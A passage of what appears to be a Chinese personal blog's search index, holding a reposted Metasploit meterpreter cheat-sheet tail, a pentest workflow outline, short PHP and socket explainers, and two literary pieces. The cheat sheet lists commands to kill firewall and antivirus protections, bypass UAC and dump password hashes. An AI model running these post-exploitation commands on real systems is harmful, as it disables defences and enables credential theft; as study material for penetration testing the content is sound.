IHAZSECURITY\\\\Admininistrator\n\n查看目标主机都采取了那些防范保护措施，列出帮助菜单，关闭防火墙以及其它我们发现的保护措施。\n\nmeterpreter>run getcountermeasure\n\nmeterpreter>run getcountermeasure -h\n\nmeterpreter>run getcountermeasure -d -k\n\n识别被控制的主机是否是一台虚拟机。\n\nmeterpreter>run checkvm\n\n在一个meterpreter会话界面中使用cmd shell。\n\nmeterpreter>shell\n\n获取目标主机的图形界面（VNC）.\n\nmeterpreter>run vnc\n\n使正在运行的meterpreter界面在后台运行。\n\nmeterpreter>background\n\n绕过windows的用户账户控制（UAC）机制。\n\nmeterpreter>run post/windows/escalate/bypassuac\n\n导出苹果OS-X系统的口令哈希值。\n\nmeterpreter>run post/osx/gather/hashdump\n\n导出linux系统的口令哈希值。\n\nmeterpreter>run post/linux/gather/hashdump\n\n\n\n\n\n转载自:<https://www.cnblogs.com/hijacklinux/p/7072854.html>\n\n","tags":["metasploit"],"categories":["渗透测试"]},{"title":"socket套接字","url":"/2019/04/24/socket套接字/","content":"\n**socket (套接字)**\n\nsocket是对传输层协议的封装\n\nsocket本身不是协议而是一个调用接口(API)\n\nsocket类型：\n\n基于tcp协议的流式socket\n\n基于udp协议的报式socket\n\n","categories":["python工具开发"]},{"title":"php简介","url":"/2019/04/24/php简介/","content":"\n**PHP 文件是什么？**\n\n- PHP（全称：PHP：Hypertext Preprocessor，即\"PHP：超文本预处理器\"）是一种通用开源脚本语言。\n- PHP 脚本在服务器上执行。\n- PHP 可免费下载使用。\n\n**PHP 文件是什么？**\n\n- PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码\n- PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器\n- PHP 文件的默认文件扩展名是 \".php\"\n\n**PHP 能做什么？**\n\n- PHP 可以生成动态页面内容\n- PHP 可以创建、打开、读取、写入、关闭服务器上的文件\n- PHP 可以收集表单数据\n- PHP 可以发送和接收 cookies\n- PHP 可以添加、删除、修改您的数据库中的数据\n- PHP 可以限制用户访问您的网站上的一些页面\n- PHP 可以加密数据\n\n通过 PHP，您不再限于输出 HTML。您可以输出图像、PDF 文件，甚至 Flash 电影。您还可以输出任意的文本，比如 XHTML 和 XML。\n\n**为什么使用 PHP？**\n\n- PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）\n- PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）\n- PHP 提供了广泛的数据库支持\n- PHP 是免费的，可从官方的 PHP 资源下载它：[ www.php.net](http://www.php.net/)\n- PHP 易于学习，并可高效地运行在服务器端\n\n\n\n原文链接:http://www.runoob.com/php/php-intro.html","categories":["php"]},{"title":"四月二十五杂句","url":"/2019/04/24/四月二十五杂句/","content":"\n小时候早熟的后果就是长大熟烂了，往后再过一阵子比起其他人发现自己其实还烂的不够。  \n\n</br>\n\n我知道有人是爱我的，但我好像缺乏爱人的能力。  \n\n</br>\n\n人啊，明明一点儿也不了解对方，错看对方，却视彼此为独一无二的挚友，一生不解对方的真性情，待一方撒手西去，还要为其哭泣，念诵悼词。\n\n</br>\n\n如今的我，谈不上幸福，也谈不上不幸。\n\n</br>\n\n若能避开猛烈的狂喜 ，自然也不会有悲痛的来袭 。\n\n</br>\n\n只有活的愚昧，或活得无耻的人才能完全沉溺在幸福之中，而做不到至少其中一者的完人，活在地狱里连选择死亡也不被允许，没有一条出路，无力的绝望。\n\n</br>\n\n所谓的世人，不就是你吗。\n\n</br>\n\n​\t\t\t\t\t\t\t\t\t\t\t摘抄自《人间失格》","tags":["日常"],"categories":["故事短句"]},{"title":"渗透测试一般过程","url":"/2019/04/24/渗透测试一般过程/","content":"\n主域名-子域名-C段-端口扫描\n端口扫描-nmap\nhttp扫描-http指纹识别（web应用漏洞）\n系统漏洞： ftp，mysql弱口令，3389，rsync漏洞，\nweb应用组件漏洞: tomact弱口令，weblogic序列化，jboss序列化，\nweb漏洞：注入，弱口令，越权.\n\n","tags":["web安全"],"categories":["渗透测试"]},{"title":"人生","url":"/2019/04/24/人生/","content":"\n\n\n35岁 你因为身体越来越差\n加班越来越少\n晋升的速度也越来越缓慢 \n那天下班，媳妇告诉你\n孩子要上幼儿园了\n双语的一个月3000\n你皱了皱眉头，那边就已经不耐烦了\n“四单元的老王家孩子，一个月6000”\n“你已经这样了，你想让孩子也输？”\n你没说话，回屋给媳妇转了6000块钱\n这笔钱，你原本打算给自己过个生日，买个新电脑\n38岁，孩子上了一年级\n老师说一年级最关键，打好基础很重要\n你笑着说，是是是，老师您多照顾\n新生接待的老师看着你不明事理的脸\n给你指了一条明路\n“课外辅导班，一个月2200”\n40岁的时候，孩子上了三年级\n老师说，三年级，最关键，承上启下很重要\n你笑着说：是是是，正打算再报个补习班\n44岁，孩子上了初中\n有一天回到家，她对你说\n爸爸，我想学钢琴\n你没什么犹豫的\n你以为这些年，你已经习惯了\n但那句“爸爸现在买不起”你始终说不出口\n好在孩子比较懂事\n她说：爸爸没事，要不我先学陶笛也可以\n你看着这么懂事的孩子，却开心不起来\n46岁，孩子上了一个不好不差的高中\n有一天你在开会，接到了老师的电话\n电话里说你的孩子在学校打架了\n叫你去一趟 \n你唯唯诺诺的\n和那个比你还小5岁的领导请了个假\n到学校又被老师训了一通\n无非台词就是那一句\n你们做家长的就知道工作，能不能陪陪孩子\n你看着这个老师，有点可笑\n好像当时说：\n家长在外辛苦点\n多赚点钱让孩子多补补课的和他不是一个人\n50岁，孩子上了大学\n很争气，是一个一本\n他学的专业你有点看不懂\n你只知道工作不一定好找\n而且学费还死贵\n你和他深夜想聊聊\n准备了半斤白酒，一碟花生米\n你说着那些曾经你最讨厌的话\n还是要为以后工作着想\n挑个热门的专业\n活着比热爱重要\n你们从交流变成了争吵\n你发现，你老了\n老到可能都打不过这个18岁的孩子\n你说不过他，只能说一句：我是你爸爸！\n孩子看着你，知道再怎么争辩都没用\n这场确立你最后威严的酒局不欢而散\n你听的不真切\n在孩子回自己屋的路上好像叨叨了一句\n“我不想活的像你一样”\n怎么就哭了呢？50岁的人了\n一定是酒太辣了，对不对\n一定是酒太辣了\n55岁，孩子工作了，似乎有一点理解你了\n但你却反了过来，你说不要妥协\n56岁，孩子也结婚了\n你问他喜欢那个姑娘么\n他愣了愣说：喜欢吧\n60岁，辛苦了一辈子，想出去走走\n身边的那个人过了30年\n你依旧分不清到底喜不喜欢\n你们开始规划旅游路线\n这么多年了\n你们还是存在分歧，还是在争吵\n某个瞬间，你觉得\n这样可能也挺好\n一切都准备好了\n儿子说：爸妈，我工作太忙了\n可以帮我照顾一下孩子么\n你们退了机票，又回到了30年前\n70岁，孩子的孩子也长大了，\n不用天天操心了 \n你下定决心说：一定要去玩一趟 \n可是手边的拐杖 \n只能支持你走到楼下的花园 \n75岁，你在医院的病床上 \n身边聚满了人，\n你迷迷糊糊的看见医生摇了摇头 \n周围那些人神情肃穆 \n你明白了，你要死掉了 \n你没有感到一丝害怕 \n你突然问自己，\n我到底是什么时候死掉的呢？ \n你想起来30岁的那场婚礼 \n原来，那时候，你就死掉了吧 \n依照惯例 死前的3秒，\n你的大脑要走马灯 倒叙你这75个年头的一生 画面一张一张的过 \n1秒 2秒 两秒过去了 你面无表情的看着这两秒内的回忆 \n第3秒 突然你笑了 \n原来已经回到了15岁的那一年 你看见一个男孩 他叼着一袋牛奶，\n背着书包 从另一个女孩家的阳台下跑过 那个男孩朝窗户里看了看 \n那是15岁的你暗恋的那个女孩子 \n你想不起来她长什么样子了 \n最后一秒你努力的回忆着 \n然后终于笑了出来 \n3秒过去了 身边的人突然间开始嚎啕大哭 你可能听不清了 \n你最后听到的嘈杂的声音 \n是一群十五六的少年 \n起着哄说的 答应他 答应他 答应他!\n\n![人生](\\img\\人生.jpg)","tags":["丧"],"categories":["故事短句"]}]